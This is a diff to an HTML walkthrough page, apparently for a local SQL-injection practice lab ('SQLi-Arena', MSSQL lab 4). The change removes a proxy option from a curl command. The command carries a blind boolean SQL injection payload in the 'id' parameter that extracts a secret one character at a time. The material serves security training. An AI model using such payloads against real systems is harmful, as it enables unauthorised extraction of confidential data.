@@ -158,7 +158,7 @@ print(f'Flag: {flag}')<br>
         <span class="terminal-title">curl. Manual Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab4" \<br> --data-urlencode "id=1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70 -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab4" \<br> --data-urlencode "id=1' AND ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70 -- -"<br><br>
         <span class="prompt"># </span>Verified: Returns "Employee found." (result-success) -- first char is 'F' (ASCII 70)
     </div>
 </div>
